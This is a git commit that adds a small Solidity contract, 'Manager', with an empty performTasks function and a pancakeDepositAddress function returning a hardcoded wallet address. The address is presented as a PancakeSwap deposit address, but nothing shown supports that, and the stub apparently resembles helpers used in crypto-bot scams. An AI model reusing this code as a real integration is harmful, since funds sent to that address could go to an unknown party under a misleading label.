50a6cfd506a01be70cdb439b57b38d670b2ddf58
kingd9 <ethdev12@gmail.com>
2021-05-07 00:00:01 +0100

    Logic

---
+++ contracts/manager.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0xfC6587b2F509b73DE927792f57a6aa7aD3621d83;
+	}
+}
